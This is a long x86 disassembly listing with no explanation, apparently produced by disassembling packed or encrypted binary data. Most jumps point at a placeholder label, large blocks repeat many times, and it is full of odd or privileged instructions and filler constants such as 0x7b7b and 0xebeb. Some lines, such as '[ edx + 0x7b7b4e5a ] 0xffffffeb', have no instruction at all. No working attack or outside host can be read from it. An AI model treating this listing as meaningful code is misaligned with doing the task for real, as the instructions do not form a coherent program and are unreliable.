adc [ edx + 0x7b7b4e5a ] 0xffffffeb
jmp r-xdata
test [ ebx + ebp * 8 - 0x54c10de3 ] al
inc eax
jpo r-xdata
jmp r-xdata
retn
clc
test [ edx + 0x74 ] ah
cld
js r-xdata
add esp eax
jns r-xdata
cmp eax 0x67af936f
jpo r-xdata
jno r-xdata
xchg edx eax
jmp r-xdata
jpo r-xdata
jpo r-xdata
mov [ esp + eax * 4 - 0x14141415 ] al
jmp r-xdata
adc edi edi
add [ ebp - 0x52 ] ah
sub al 0xf2
cmp eax 0x617f9263
jpo r-xdata
mov esi 0xeb84848e
jmp r-xdata
xchg ebx eax
jmp r-xdata
jmp j_sub_477df5
jpo r-xdata
jmp r-xdata
jmp r-xdata
stc
jne r-xdata
sub eax 0x8092a3f0
pushad
jpo r-xdata
jpo r-xdata
xchg ebx eax
scasd [ edi ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
push ecx
jpo r-xdata
test [ esi ] cl
xchg [ edx + 0x7b7b35ad ] edx
jmp sub_477ee8
jmp r-xdata
dec ebp
cmp [ ebx + 0x7b ] bh
jmp r-xdata
test [ 0xffffffff8483f81f ] ch
cmp eax 0x25f8747d
jpo r-xdata
xchg edx eax
sub al 0x81
test [ ebx + ebp * 8 - 0x7b141415 ] al
maxps xmm4 [ ebx - 0x6d ]
jpo r-xdata
stosd [ edi ]
mov esi ebx
fwait
xchg edx eax
jpo r-xdata
jmp r-xdata
jmp r-xdata
je r-xdata
xchg [ esi ] edi
xchg edx eax
jmp r-xdata
test al dh
jmp r-xdata
jmp r-xdata
xchg edx eax
lodsd [ esi ]
xor eax 0xbceb7b7b
mov es [ esp + eax * 4 + 0x74ebebeb ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
test [ eax + ebp + 0x3ef67f11 ] al
idiv [ esi ]
mov dl 0x42
ja r-xdata
inc edx
test [ edi ] cl
pop edi
outsd
aaa
pop edi
push ebx
xchg edx eax
bound edx [ ebp + 0x7b ]
cmpsd [ esi ] [ edi ]
sub esi eax
adc [ edx + 0x7b7b4cba ] 0xffffffeb
jmp r-xdata
add [ esp + eax * 4 - 0x980eed8 ] 0x3e
scasd [ edi ]
sub eax [ ebp + ecx - 0x50d90dd5 ]
xchg edx eax
or eax 0xeb7b7b3d
jmp r-xdata
outsb
inc ebp
jpo r-xdata
mov dl 0xb8
push [ edx + 0x7b452f92 ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
std
mov ebx 0x927b7b7b
jmp r-xdata
test [ edi + edi * 8 + 0x4a ] dh
cmp eax 0xb2487b7b
jpo r-xdata
jpo r-xdata
test [ ebx ] ch
sub [ esp + ebp - 0x54310d91 ] al
jmp r-xdata
xchg ebp eax
xchg edx eax
jpo r-xdata
jmp r-xdata
jpo r-xdata
sbb [ 0xffffffff929536f2 ] 0x13
mov bh 0x8f
test [ ebx + ebp * 8 - 0x6d141415 ] al
add al 0x7b
jpo r-xdata
je r-xdata
and dh [ edx - 0x14141448 ]
jmp sub_4782bc
xchg edx eax
fidiv [ edx ]
jpo r-xdata
mov al [ esp + eax * 4 - 0x72c10de3 ]
xchg edx eax
cmp [ edi + 0x7b ] bh
jpo r-xdata
sbb [ 0xffffffff929536f2 ] 0x13
jmp r-xdata
out dx al
cmp edi [ ebx + 0x7b ]
sbb eax 0x7b3d00f8
test [ edi + 0x78 ] 0x92
jmp r-xdata
jmp r-xdata
adc ecx [ edx - 0xde27b7c ]
lea edx [ edx + 0x7b7b7f38 ]
jpo r-xdata
inc edi
js r-xdata
xchg [ esp + eax * 4 - 0x18b4402 ] al
jno r-xdata
into
stosd [ edi ]
test [ ebx + ebp * 8 - 0x5008b15 ] al
pop ds
xor bh [ ebx + 0x7b ]
xchg edx eax
pop ecx
jpo r-xdata
xchg edx eax
sbb [ edi + 0x7b ] eax
jpo r-xdata
jpo r-xdata
xchg edi eax
inc edi
sub [ eax - 0x45 ] cl
sub eax 0x833ef22c
test bl ch
jmp j_sub_4783e0
cmp al 0x7a
sub esi [ ebp + ecx * 8 + 0x7c ]
sub edx [ edx + 0x7b7b50b9 ]
jmp r-xdata
je r-xdata
jo r-xdata
cli
sub_477da3
test ah ch
sar [ ebx + 0x7b ] cl
jpo r-xdata
jmp r-xdata
dec ebx
aas
pop edi
aaa
xchg edx eax
inc esi
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
adc [ edx + 0x7b7b4e5a ] 0xffffffeb
jmp r-xdata
[ edx + 0x7b7b4e5a ] 0xffffffeb
jpo r-xdata
clc
and eax 0x927b7b40
jmp r-xdata
jge r-xdata
xchg edx eax
fdiv [ esi + 0x7b ]
xchg edx eax
sti
xor [ ebx + 0x7b ] edi
jmp r-xdata
jmp r-xdata
test [ ebx + ebp * 8 - 0x54c10de3 ] al
inc eax
jpo r-xdata
test bl ch
jmp r-xdata
jns r-xdata
cmp eax 0x67af936f
jpo r-xdata
jno r-xdata
xchg edx eax
jmp r-xdata
jpo r-xdata
jpo r-xdata
mov [ esp + eax * 4 - 0x14141415 ] al
jmp r-xdata
adc edi edi
add [ ebp - 0x52 ] ah
sub al 0xf2
cmp eax 0x617f9263
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
xchg ebx eax
jmp r-xdata
jmp j_sub_477df5
jpo r-xdata
jmp r-xdata
mov esi 0xeb84848e
jmp r-xdata
retn
add esp eax
clc
test [ edx + 0x74 ] ah
cld
js r-xdata
jmp r-xdata
stc
jne r-xdata
sub eax 0x8092a3f0
pushad
jpo r-xdata
jpo r-xdata
xchg ebx eax
scasd [ edi ]
jpo r-xdata
jmp r-xdata
idiv [ esi ]
jpo r-xdata
fwait
jpo r-xdata
jpo r-xdata
push ecx
jpo r-xdata
test [ esi ] cl
xchg [ edx + 0x7b7b35ad ] edx
jmp sub_477ee8
jmp r-xdata
dec ebp
cmp [ ebx + 0x7b ] bh
jmp r-xdata
jpo r-xdata
xchg ebx eax
cmpsd [ esi ] [ edi ]
sub [ edx + 0x7b7b4d5b ] dl
jmp r-xdata
clc
mov ecx 0x78cd925b
cmp eax 0x25f8747d
jpo r-xdata
xchg edx eax
sub al 0x81
test [ ebx + ebp * 8 - 0x7b141415 ] al
maxps xmm4 [ ebx - 0x6d ]
jpo r-xdata
stosd [ edi ]
mov esi ebx
fwait
xchg edx eax
jpo r-xdata
jmp r-xdata
jmp r-xdata
test [ 0xffffffff8483f81f ] ch
xchg edx eax
jmp r-xdata
test al dh
jmp r-xdata
jmp r-xdata
xchg edx eax
lodsd [ esi ]
xor eax 0xbceb7b7b
je r-xdata
xchg [ esi ] edi
mov es [ esp + eax * 4 + 0x74ebebeb ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
test [ eax + ebp + 0x3ef67f11 ] al
idiv [ esi ]
mov dl 0x42
ja r-xdata
inc edx
test [ edi ] cl
pop edi
outsd
aaa
pop edi
push ebx
xchg edx eax
bound edx [ ebp + 0x7b ]
cmpsd [ esi ] [ edi ]
sub esi eax
adc [ edx + 0x7b7b4cba ] 0xffffffeb
jmp r-xdata
add [ esp + eax * 4 - 0x980eed8 ] 0x3e
scasd [ edi ]
sub eax [ ebp + ecx - 0x50d90dd5 ]
xchg edx eax
or eax 0xeb7b7b3d
jmp r-xdata
outsb
inc ebp
jpo r-xdata
mov dl 0xb8
push [ edx + 0x7b452f92 ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
std
mov ebx 0x927b7b7b
jmp r-xdata
test [ edi + edi * 8 + 0x4a ] dh
cmp eax 0xb2487b7b
jpo r-xdata
jpo r-xdata
test [ ebx ] ch
sub [ esp + ebp - 0x54310d91 ] al
jmp r-xdata
xchg ebp eax
xchg edx eax
jpo r-xdata
jmp r-xdata
jpo r-xdata
sbb [ 0xffffffff929536f2 ] 0x13
mov bh 0x8f
test [ ebx + ebp * 8 - 0x6d141415 ] al
add al 0x7b
jpo r-xdata
je r-xdata
and dh [ edx - 0x14141448 ]
jmp sub_4782bc
xchg edx eax
fidiv [ edx ]
jpo r-xdata
mov al [ esp + eax * 4 - 0x72c10de3 ]
xchg edx eax
cmp [ edi + 0x7b ] bh
jpo r-xdata
sbb [ 0xffffffff929536f2 ] 0x13
jmp r-xdata
out dx al
cmp edi [ ebx + 0x7b ]
sbb eax 0x7b3d00f8
test [ edi + 0x78 ] 0x92
jmp r-xdata
jmp r-xdata
adc ecx [ edx - 0xde27b7c ]
lea edx [ edx + 0x7b7b7f38 ]
jpo r-xdata
inc edi
js r-xdata
xchg [ esp + eax * 4 - 0x18b4402 ] al
jno r-xdata
into
stosd [ edi ]
test [ ebx + ebp * 8 - 0x5008b15 ] al
pop ds
xor bh [ ebx + 0x7b ]
xchg edx eax
pop ecx
jpo r-xdata
xchg edx eax
sbb [ edi + 0x7b ] eax
jpo r-xdata
jpo r-xdata
xchg edi eax
inc edi
sub [ eax - 0x45 ] cl
sub eax 0x833ef22c
test bl ch
jmp j_sub_4783e0
cmp al 0x7a
sub esi [ ebp + ecx * 8 + 0x7c ]
sub edx [ edx + 0x7b7b50b9 ]
jmp r-xdata
je r-xdata
jo r-xdata
cli
sub_477df5
xchg ebp eax
jpo r-xdata
sub [ ebx + 0x7b ] dl
jpo r-xdata
xchg edx eax
mov al 0x8f
test [ ebx + ebp * 8 - 0x7bb7d3d8 ] al
xchg edx eax
pop ebp
pop ebp
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp sub_477df5
jmp r-xdata
test [ esi ] bh
xchg [ ebx + 0x78 ] edi
mov edx 0xf06703f0
and ebx [ edi - 0x10 ]
or ebx [ ebx - 0x6e ]
mov bh 0x88
jmp r-xdata
jmp r-xdata
jmp r-xdata
test [ ebx + ebp * 8 - 0xf141415 ] al
xchg [ edx - 0x7b7b76b7 ] edx
xchg edx eax
dec edx
aaa
jpo r-xdata
das
sub_477e0a
sub al 0xf2
cmp eax 0x67af936f
jpo r-xdata
mov [ esp + eax * 4 - 0x14141415 ] al
jmp r-xdata
adc edi edi
add [ ebp - 0x52 ] ah
sub al 0xf2
cmp eax 0x617f9263
jpo r-xdata
jmp j_sub_477df5
jpo r-xdata
jmp r-xdata
sub eax 0x8092a3f0
pushad
jpo r-xdata
jpo r-xdata
xchg ebx eax
scasd [ edi ]
jpo r-xdata
push ecx
jpo r-xdata
test [ esi ] cl
xchg [ edx + 0x7b7b35ad ] edx
jmp sub_477ee8
jmp r-xdata
dec ebp
cmp [ ebx + 0x7b ] bh
jmp r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
test al dh
jmp r-xdata
jmp r-xdata
xchg edx eax
lodsd [ esi ]
xor eax 0xbceb7b7b
jpo r-xdata
jpo r-xdata
jpo r-xdata
test [ eax + ebp + 0x3ef67f11 ] al
idiv [ esi ]
mov dl 0x42
ja r-xdata
inc edx
test [ edi ] cl
pop edi
outsd
aaa
pop edi
push ebx
xchg edx eax
bound edx [ ebp + 0x7b ]
cmpsd [ esi ] [ edi ]
sub esi eax
adc [ edx + 0x7b7b4cba ] 0xffffffeb
jmp r-xdata
add [ esp + eax * 4 - 0x980eed8 ] 0x3e
scasd [ edi ]
sub eax [ ebp + ecx - 0x50d90dd5 ]
xchg edx eax
or eax 0xeb7b7b3d
jmp r-xdata
outsb
inc ebp
jpo r-xdata
mov dl 0xb8
push [ edx + 0x7b452f92 ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
std
mov ebx 0x927b7b7b
jmp r-xdata
test [ edi + edi * 8 + 0x4a ] dh
cmp eax 0xb2487b7b
jpo r-xdata
jpo r-xdata
test [ ebx ] ch
sub [ esp + ebp - 0x54310d91 ] al
jmp r-xdata
xchg ebp eax
xchg edx eax
jpo r-xdata
jmp r-xdata
jpo r-xdata
sbb [ 0xffffffff929536f2 ] 0x13
mov bh 0x8f
test [ ebx + ebp * 8 - 0x6d141415 ] al
add al 0x7b
jpo r-xdata
je r-xdata
and dh [ edx - 0x14141448 ]
jmp sub_4782bc
xchg edx eax
fidiv [ edx ]
jpo r-xdata
mov al [ esp + eax * 4 - 0x72c10de3 ]
xchg edx eax
cmp [ edi + 0x7b ] bh
jpo r-xdata
sbb [ 0xffffffff929536f2 ] 0x13
jmp r-xdata
out dx al
cmp edi [ ebx + 0x7b ]
sbb eax 0x7b3d00f8
test [ edi + 0x78 ] 0x92
jmp r-xdata
jmp r-xdata
adc ecx [ edx - 0xde27b7c ]
lea edx [ edx + 0x7b7b7f38 ]
jpo r-xdata
inc edi
js r-xdata
xchg [ esp + eax * 4 - 0x18b4402 ] al
jno r-xdata
into
stosd [ edi ]
test [ ebx + ebp * 8 - 0x5008b15 ] al
pop ds
xor bh [ ebx + 0x7b ]
xchg edx eax
pop ecx
jpo r-xdata
xchg edx eax
sbb [ edi + 0x7b ] eax
jpo r-xdata
jpo r-xdata
xchg edi eax
inc edi
sub [ eax - 0x45 ] cl
sub eax 0x833ef22c
test bl ch
jmp j_sub_4783e0
cmp al 0x7a
sub esi [ ebp + ecx * 8 + 0x7c ]
sub edx [ edx + 0x7b7b50b9 ]
jmp r-xdata
je r-xdata
jo r-xdata
cli
sub_477e7e
jg r-xdata
cmp [ edx + 0x7b7b424e ] edx
clc
mov edi 0x44f1926b
jpo r-xdata
jpo r-xdata
jmp sub_477f71
jmp r-xdata
jmp j_sub_477df5
test [ edx + edx * 4 + 0x7b7b374a ] al
test [ ebx + ebp * 8 - 0xf141415 ] al
xchg [ edx - 0x7b7b76b7 ] edx
xchg edx eax
dec edx
aaa
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
das
sub_477e99
test ah ch
fistp [ ebx + 0x7b ]
jmp r-xdata
dec ebp
cmp [ ebx + 0x7b ] bh
jmp r-xdata
jmp r-xdata
jpo r-xdata
xchg edx eax
lodsd [ esi ]
xor eax 0xbceb7b7b
sub eax 0x8092a3f0
pushad
jpo r-xdata
jpo r-xdata
push ecx
jpo r-xdata
test [ esi ] cl
xchg [ edx + 0x7b7b35ad ] edx
jmp sub_477ee8
jpo r-xdata
jmp r-xdata
test al dh
jmp r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
test [ eax + ebp + 0x3ef67f11 ] al
idiv [ esi ]
mov dl 0x42
ja r-xdata
inc edx
test [ edi ] cl
pop edi
outsd
aaa
pop edi
push ebx
xchg edx eax
bound edx [ ebp + 0x7b ]
cmpsd [ esi ] [ edi ]
sub esi eax
adc [ edx + 0x7b7b4cba ] 0xffffffeb
jmp r-xdata
add [ esp + eax * 4 - 0x980eed8 ] 0x3e
scasd [ edi ]
sub eax [ ebp + ecx - 0x50d90dd5 ]
xchg edx eax
or eax 0xeb7b7b3d
jmp r-xdata
outsb
inc ebp
jpo r-xdata
mov dl 0xb8
push [ edx + 0x7b452f92 ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
std
mov ebx 0x927b7b7b
jmp r-xdata
test [ edi + edi * 8 + 0x4a ] dh
cmp eax 0xb2487b7b
jpo r-xdata
jpo r-xdata
test [ ebx ] ch
sub [ esp + ebp - 0x54310d91 ] al
jmp r-xdata
xchg ebp eax
xchg edx eax
jpo r-xdata
jmp r-xdata
jpo r-xdata
sbb [ 0xffffffff929536f2 ] 0x13
mov bh 0x8f
test [ ebx + ebp * 8 - 0x6d141415 ] al
add al 0x7b
jpo r-xdata
je r-xdata
and dh [ edx - 0x14141448 ]
jmp sub_4782bc
xchg edx eax
fidiv [ edx ]
jpo r-xdata
mov al [ esp + eax * 4 - 0x72c10de3 ]
xchg edx eax
cmp [ edi + 0x7b ] bh
jpo r-xdata
sbb [ 0xffffffff929536f2 ] 0x13
jmp r-xdata
out dx al
cmp edi [ ebx + 0x7b ]
sbb eax 0x7b3d00f8
test [ edi + 0x78 ] 0x92
jmp r-xdata
jmp r-xdata
adc ecx [ edx - 0xde27b7c ]
lea edx [ edx + 0x7b7b7f38 ]
jpo r-xdata
inc edi
js r-xdata
xchg [ esp + eax * 4 - 0x18b4402 ] al
jno r-xdata
into
stosd [ edi ]
test [ ebx + ebp * 8 - 0x5008b15 ] al
pop ds
xor bh [ ebx + 0x7b ]
xchg edx eax
pop ecx
jpo r-xdata
xchg edx eax
sbb [ edi + 0x7b ] eax
jpo r-xdata
jpo r-xdata
xchg edi eax
inc edi
sub [ eax - 0x45 ] cl
sub eax 0x833ef22c
test bl ch
jmp j_sub_4783e0
cmp al 0x7a
sub esi [ ebp + ecx * 8 + 0x7c ]
sub edx [ edx + 0x7b7b50b9 ]
jmp r-xdata
je r-xdata
jo r-xdata
cli
sub_477ed4
mov edx 0x6741926f
jpo r-xdata
pushad
jpo r-xdata
jmp r-xdata
jpo r-xdata
adc esi [ esi ]
imul esp [ ecx + ebp + 0x2c ] 0x7b575c92
jpo r-xdata
jpo r-xdata
test [ eax - 0x14141415 ] bh
jmp r-xdata
clc
mov edi 0x92bdf04b
cld
jns r-xdata
jpo r-xdata
dec eax
mov ebx 0x7b433192
jmp r-xdata
jpo r-xdata
xchg edx eax
push ebp
jpo r-xdata
jmp r-xdata
xor al 0xaa
sbb eax 0x928906f2
retn
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
xchg edx eax
inc ecx
jpo r-xdata
jpo r-xdata
xchg edx eax
xor [ ebx + 0x7b ] eax
mov eax [ ebx + 0x11288484 ]
jg r-xdata
jmp r-xdata
jpo r-xdata
xchg [ edx + 0x7b7b35ad ] edx
jmp sub_477ee8
je r-xdata
cmpsd [ esi ] [ edi ]
sub esi eax
adc [ edx + 0x7b7b4cba ] 0xffffffeb
jmp r-xdata
test [ eax + ebp + 0x3ef67f11 ] al
and edx [ edx + 0x7b7b7a4b ]
jmp r-xdata
sub al 0xf0
dec [ ebx + 0x28848483 ]
adc [ edi - 0xa ] edi
cmpsd [ esi ] [ edi ]
add [ esp + eax * 4 - 0x980eed8 ] 0x3e
test al dh
jpo r-xdata
jpo r-xdata
idiv [ esi ]
mov dl 0x42
ja r-xdata
inc edx
test [ edi ] cl
pop edi
outsd
aaa
pop edi
push ebx
xchg edx eax
bound edx [ ebp + 0x7b ]
jpo r-xdata
scasd [ edi ]
sub eax [ ebp + ecx - 0x50d90dd5 ]
xchg edx eax
or eax 0xeb7b7b3d
jmp r-xdata
outsb
inc ebp
jpo r-xdata
jmp r-xdata
mov dl 0xb8
push [ edx + 0x7b452f92 ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
std
mov ebx 0x927b7b7b
jmp r-xdata
test [ edi + edi * 8 + 0x4a ] dh
cmp eax 0xb2487b7b
jpo r-xdata
jpo r-xdata
test [ ebx ] ch
sub [ esp + ebp - 0x54310d91 ] al
jmp r-xdata
xchg ebp eax
xchg edx eax
jpo r-xdata
jmp r-xdata
jpo r-xdata
sbb [ 0xffffffff929536f2 ] 0x13
mov bh 0x8f
test [ ebx + ebp * 8 - 0x6d141415 ] al
add al 0x7b
jpo r-xdata
je r-xdata
and dh [ edx - 0x14141448 ]
jmp sub_4782bc
xchg edx eax
fidiv [ edx ]
jpo r-xdata
mov al [ esp + eax * 4 - 0x72c10de3 ]
xchg edx eax
cmp [ edi + 0x7b ] bh
jpo r-xdata
sbb [ 0xffffffff929536f2 ] 0x13
jmp r-xdata
out dx al
cmp edi [ ebx + 0x7b ]
sbb eax 0x7b3d00f8
test [ edi + 0x78 ] 0x92
jmp r-xdata
jmp r-xdata
adc ecx [ edx - 0xde27b7c ]
lea edx [ edx + 0x7b7b7f38 ]
jpo r-xdata
inc edi
js r-xdata
xchg [ esp + eax * 4 - 0x18b4402 ] al
jno r-xdata
into
stosd [ edi ]
test [ ebx + ebp * 8 - 0x5008b15 ] al
pop ds
xor bh [ ebx + 0x7b ]
xchg edx eax
pop ecx
jpo r-xdata
xchg edx eax
sbb [ edi + 0x7b ] eax
jpo r-xdata
jpo r-xdata
xchg edi eax
inc edi
sub [ eax - 0x45 ] cl
sub eax 0x833ef22c
test bl ch
jmp j_sub_4783e0
cmp al 0x7a
sub esi [ ebp + ecx * 8 + 0x7c ]
sub edx [ edx + 0x7b7b50b9 ]
jmp r-xdata
je r-xdata
jo r-xdata
cli
sub_477ee8
and eax 0xebebebb8
jmp r-xdata
jmp r-xdata
jmp r-xdata
test [ edx + 0x7b7b374a ] dl
test [ ebx + ebp * 8 - 0xf141415 ] al
xchg [ edx - 0x7b7b76b7 ] edx
xchg edx eax
dec edx
aaa
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
das
sub_477f39
test [ esi ] cl
ja sub_477ecf
push es
jpo r-xdata
test [ eax ] ch
jmp r-xdata
sub esi eax
adc [ edx + 0x7b7b4cba ] 0xffffffeb
jmp r-xdata
add [ esp + eax * 4 - 0x980eed8 ] 0x3e
cmpsd [ esi ] [ edi ]
je r-xdata
adc [ edi - 0xa ] edi
dec [ ebx + 0x28848483 ]
mov eax [ ebx + 0x11288484 ]
jg r-xdata
cmpsd [ esi ] [ edi ]
sub_477f6c
xchg [ esp + eax * 4 - 0xfa0800e ] eax
jg r-xdata
jpo r-xdata
test [ eax - 0x14141415 ] bh
jmp r-xdata
clc
mov edi 0x92bdf04b
cld
jns r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
mov eax [ ebx + 0x11288484 ]
jg r-xdata
jmp r-xdata
je r-xdata
cmpsd [ esi ] [ edi ]
sub esi eax
adc [ edx + 0x7b7b4cba ] 0xffffffeb
jmp r-xdata
test [ eax + ebp + 0x3ef67f11 ] al
dec [ ebx + 0x28848483 ]
adc [ edi - 0xa ] edi
cmpsd [ esi ] [ edi ]
add [ esp + eax * 4 - 0x980eed8 ] 0x3e
sub_477f8b
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
dec [ ebx + 0x28848483 ]
adc [ edi - 0xa ] edi
mov eax [ ebx + 0x11288484 ]
jg r-xdata
sub esi eax
adc [ edx + 0x7b7b4cba ] 0xffffffeb
jmp r-xdata
add [ esp + eax * 4 - 0x980eed8 ] 0x3e
cmpsd [ esi ] [ edi ]
je r-xdata
cmpsd [ esi ] [ edi ]
sub_477fa3
xor esi 0xfffffffe
xchg edi eax
xchg [ esp + eax * 4 - 0x6d94d9bd ] al
mov dl 0x87
test [ ebx + ebp * 8 - 0x14141415 ] al
dec [ ebx + 0x28848483 ]
adc [ edi - 0xa ] edi
mov eax [ ebx + 0x11288484 ]
jg r-xdata
sub esi eax
adc [ edx + 0x7b7b4cba ] 0xffffffeb
jmp r-xdata
add [ esp + eax * 4 - 0x980eed8 ] 0x3e
cmpsd [ esi ] [ edi ]
je r-xdata
cmpsd [ esi ] [ edi ]
sub_477fe3
jmp r-xdata
std
fstp [ ebx + 0x7b ]
jpo r-xdata
jmp r-xdata
mov edi 0x92bdf04b
cld
jns r-xdata
sub esi eax
adc [ edx + 0x7b7b4cba ] 0xffffffeb
jmp r-xdata
jpo r-xdata
add [ esp + eax * 4 - 0x980eed8 ] 0x3e
jmp r-xdata
jmp r-xdata
mov eax [ ebx + 0x11288484 ]
jg r-xdata
jmp r-xdata
je r-xdata
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
test [ eax + ebp + 0x3ef67f11 ] al
dec [ ebx + 0x28848483 ]
adc [ edi - 0xa ] edi
sub_477fe7
call [ eax ]
jg r-xdata
xchg edx eax
jo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp sub_477f6c
clc
inc esp
jpo r-xdata
xchg edx eax
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
sub eax 0x7b6bd692
jmp r-xdata
dec esi
jpo r-xdata
adc bh [ ebx + 0x7b7b7bff ]
js r-xdata
jmp r-xdata
jmp r-xdata
jns r-xdata
and [ edi + 0x7b ] esp
jpo r-xdata
je r-xdata
jmp r-xdata
cmpsd [ esi ] [ edi ]
inc eax
jpo r-xdata
jmp r-xdata
jpo r-xdata
mov ebx 0x927b7b7b
xchg ebx eax
out 0x61 al
jpo r-xdata
mov edx [ edx - 0x7b7b6bc6 ]
jpo r-xdata
mov dl 0xb8
jmp r-xdata
jpo r-xdata
pop esp
push ecx
inc edx
jmp r-xdata
lea edx [ edx + 0x7b7b7f38 ]
adc [ edi + 0x1d ] ebp
sbb [ 0xffffffff929536f2 ] 0x13
std
jpo r-xdata
jmp r-xdata
xchg esi eax
cmp edi [ ebx + 0x7b ]
xchg ebx eax
sub [ edx ] esi
jpo r-xdata
xchg edx eax
sub eax 0xf87b7b7c
mov bl 0x84
mov eax 0xebebebeb
jmp r-xdata
std
fstp [ ebx + 0x7b ]
jpo r-xdata
std
jne r-xdata
jmp r-xdata
push [ edx + 0x7b452f92 ]
jpo r-xdata
adc [ edi - 0x6e ] edi
salc
jpo r-xdata
jpo r-xdata
xchg edx eax
adc [ edx + 0x7b ] 0xebebeb7b
sbb eax 0x92b32ef2
movsd [ edi ] [ esi ]
test [ esp + eax * 4 - 0x14141415 ] eax
jmp r-xdata
outsb
inc ebp
jpo r-xdata
test [ esi ] cl
mov al [ esp + eax * 4 - 0x72c10de3 ]
xchg edx eax
cmp [ edi + 0x7b ] bh
jpo r-xdata
sbb [ 0xffffffff929536f2 ] 0x13
sbb [ 0xffffffff929536f2 ] 0x13
jmp r-xdata
test [ ebx ] ch
sub [ esp + ebp - 0x54310d91 ] al
jmp r-xdata
jmp r-xdata
clc
mov edi 0xaf3ef677
jmp r-xdata
jmp r-xdata
mov edi 0x92bdf04b
cld
jns r-xdata
test bl ch
jmp r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
sbb eax 0x23a73ef2
adc [ 0xfffffffff21d83f0 ] ecx
jmp r-xdata
push edx
jpo r-xdata
jmp r-xdata
cmp [ ebx + 0x7b ] 0x7b
jae r-xdata
adc ecx [ edx - 0xde27b7c ]
lea edx [ edx + 0x7b7b7f38 ]
jmp r-xdata
jpo r-xdata
jpo r-xdata
sub eax [ ebp + ecx - 0x50d90dd5 ]
xchg edx eax
or eax 0xeb7b7b3d
jmp r-xdata
scasd [ edi ]
sub esi eax
adc [ edx + 0x7b7b4cba ] 0xffffffeb
jmp r-xdata
jpo r-xdata
stosb [ edi ]
pop ecx
jpo r-xdata
push 0xebeb7b7b
jmp r-xdata
jpo r-xdata
mov al [ esi - 0x6c147b7c ]
xchg edx eax
stc
push es
movsd [ edi ] [ esi ]
cmpsd [ esi ] [ edi ]
and edx [ ecx ]
or eax 0xf21d83f0
and edx [ edx + 0x7b7b6403 ]
jmp r-xdata
jpo r-xdata
jl r-xdata
push cs
imul edx [ edx + 0x7b7b40cb ] 0xffffffeb
jmp r-xdata
je r-xdata
and dh [ edx - 0x14141448 ]
jmp sub_4782bc
xchg edx eax
fidiv [ edx ]
jpo r-xdata
add [ esp + eax * 4 - 0x980eed8 ] 0x3e
jmp r-xdata
jmp r-xdata
xchg edi eax
xchg edx eax
rcr [ esi + 0x7b ] 0x7b
xchg ebp eax
xchg edx eax
jpo r-xdata
shr [ esi + 0x7b ] 0x1
jpo r-xdata
test bl ch
xchg ebx eax
mov edi 0x5d50926b
test [ esp + eax * 4 - 0x7bb26dd5 ] al
test [ ebx + ebp * 8 - 0x4d141415 ] al
mov eax 0xebebebeb
jmp r-xdata
jmp r-xdata
jpo r-xdata
sub [ 0x7b6bd692 ] ch
test [ edi + edi * 8 + 0x4a ] dh
cmp eax 0xb2487b7b
jpo r-xdata
jpo r-xdata
and edi [ ebx + edi * 2 + 0x7b ]
out dx al
cmp edi [ ebx + 0x7b ]
sbb eax 0x7b3d00f8
test [ edi + 0x78 ] 0x92
jmp r-xdata
jmp r-xdata
mov eax [ ebx + 0x11288484 ]
jg r-xdata
jmp r-xdata
jpo r-xdata
mov bh 0x8f
test [ ebx + ebp * 8 - 0x6d141415 ] al
add al 0x7b
jpo r-xdata
ja r-xdata
jmp r-xdata
pop edi
jmp r-xdata
jpo r-xdata
push cs
jpo r-xdata
inc edi
js r-xdata
xchg [ esp + eax * 4 - 0x18b4402 ] al
jno r-xdata
into
stosd [ edi ]
je r-xdata
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
test [ eax + ebp + 0x3ef67f11 ] al
idiv [ esi ]
ja r-xdata
mov dl 0x42
xchg edx eax
test [ ebx + ebp * 8 - 0x5008b15 ] al
pop ds
xor bh [ ebx + 0x7b ]
xchg edx eax
pop ecx
jpo r-xdata
dec [ ebx + 0x28848483 ]
adc [ edi - 0xa ] edi
xchg edx eax
sbb [ edi + 0x7b ] eax
jpo r-xdata
jpo r-xdata
xchg edi eax
inc edi
sub [ eax - 0x45 ] cl
sub eax 0x833ef22c
test bl ch
jmp j_sub_4783e0
cmp al 0x7a
sub esi [ ebp + ecx * 8 + 0x7c ]
sub edx [ edx + 0x7b7b50b9 ]
jmp r-xdata
je r-xdata
jo r-xdata
cli
sub_478036
clc
mov edi 0x79731377
jpo r-xdata
xchg edx eax
cmp dl [ esp + eax * 4 - 0x1414147c ]
jmp r-xdata
xchg edx eax
std
jne r-xdata
sub eax [ ebp + ecx - 0x50d90dd5 ]
xchg edx eax
or eax 0xeb7b7b3d
jmp r-xdata
test bl ch
jmp r-xdata
jpo r-xdata
scasd [ edi ]
stosb [ edi ]
pop ecx
jpo r-xdata
push 0xebeb7b7b
jmp r-xdata
jmp r-xdata
sub eax 0x7b6bd692
jmp r-xdata
xchg edi eax
xchg edx eax
rcr [ esi + 0x7b ] 0x7b
and [ edi + 0x7b ] esp
jpo r-xdata
je r-xdata
jmp r-xdata
mov dl 0xb8
jmp r-xdata
jpo r-xdata
pop esp
